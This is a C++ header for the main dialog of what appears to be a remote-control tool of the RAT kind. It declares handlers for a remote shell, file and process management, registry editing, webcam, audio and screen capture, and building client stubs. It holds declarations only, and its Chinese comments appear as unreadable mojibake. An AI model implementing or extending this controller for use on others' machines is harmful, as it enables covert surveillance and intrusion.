
// RemoteDlg.h : ͷ�ļ�
//

#pragma once
#include "afxcmn.h"
#include "TrueColorToolBar.h"
#include "IOCPServer.h"
#include "FloatWnd.h"


// CRemoteDlg �Ի���
class CRemoteDlg : public CDialogEx
{
// ����
public:
	CRemoteDlg(CWnd* pParent = NULL);	// ��׼���캯��

	CTrueColorToolBar m_ToolBar;        // ��������չ��
	CFloatWnd* m_FloatWnd;

// �Ի�������
	enum { IDD = IDD_REMOTE_DIALOG };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV ֧��


// ʵ��
protected:
	HICON m_hIcon;
	NOTIFYICONDATA nid;             //ϵͳ���̽ṹ
	CStatusBar  m_wndStatusBar;     //���һ��״̬��
	int iCount;                     //�ж��ٸ��ͻ�������

	// ���ɵ���Ϣӳ�亯��
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	CListCtrl m_CList_Online;
	CListCtrl m_CList_Message;
	afx_msg void OnSize(UINT nType, int cx, int cy);
	// ��ʼ����Ա����
	int InitList(void);
	void CRemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing,ClientContext	*pContext);
	void ShowMessage(bool bOk, CString strMsg);
	void TestOnline(void);
	afx_msg void OnRclickOnline(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnOnlineCmd();
	afx_msg void OnOnlineProcess();
	afx_msg void OnOnlineWindow();
	afx_msg void OnOnlineDesktop();
	afx_msg void OnOnlineFile();
	afx_msg void OnOnlineAudio();
	afx_msg void OnOnlineVideo();
	afx_msg void OnOnlineServer();
	afx_msg void OnOnlineRegister();
	afx_msg void OnOnlineDelete();
	afx_msg void OnMainClose();
	afx_msg void OnMainAbout();
	afx_msg void OnMainSet();
	afx_msg void OnMainBuild();
	afx_msg void OnOnlineRegedit();
    afx_msg LRESULT OnOpenRegEditDialog(WPARAM, LPARAM);    //�Զ�����Ϣ��ע���
	afx_msg	LRESULT	OnOpenWebCamDialog(WPARAM, LPARAM);     //�Զ�����Ϣ����Ƶ����
	afx_msg void OnIconNotify(WPARAM wParam,LPARAM lParam); //�Զ�����Ϣ(ϵͳ����)
	afx_msg LRESULT OnOpenShellDialog(WPARAM,LPARAM);       //�Զ�����Ϣ(Զ���ն�)
	afx_msg LRESULT OnOpenSystemDialog(WPARAM,LPARAM);      //�Զ�����Ϣ�����̹���
	afx_msg LRESULT OnOpenManagerDialog(WPARAM,LPARAM );    //�Զ�����Ϣ���ļ�����
	afx_msg	LRESULT	OnOpenAudioDialog(WPARAM, LPARAM);      //�Զ�����Ϣ����Ƶ����
	afx_msg	LRESULT OnOpenScreenSpyDialog(WPARAM, LPARAM);  //�Զ�����Ϣ���������
	afx_msg	LRESULT	OnOpenServerDialog(WPARAM, LPARAM);     //�Զ�����Ϣ ���������
	afx_msg LRESULT OnAddToList(WPARAM, LPARAM);
	
	// ״̬��
	void CreatStatusBar(void);
	// ������
	void CreateToolBar(void);
	// ϵͳ����
	void InitTray(PNOTIFYICONDATA nid);


	void CRemoteDlg::ListenPort(void);                        //��ȡ�����ļ�ini ������Activate��������

	afx_msg void OnNotifyShow();
	afx_msg void OnNotifyClose();
	afx_msg void OnClose();
	void Activate(UINT uPort, UINT uMaxConnections);          //��������
	void SendSelectCommand(PBYTE pData, UINT nSize);          //�򱻿ض˷�������

protected:
	static void CALLBACK NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode);
	static void ProcessReceiveComplete(ClientContext *pContext);   //�ú����Ǵ������з���˷��͹�������Ϣ
	
};
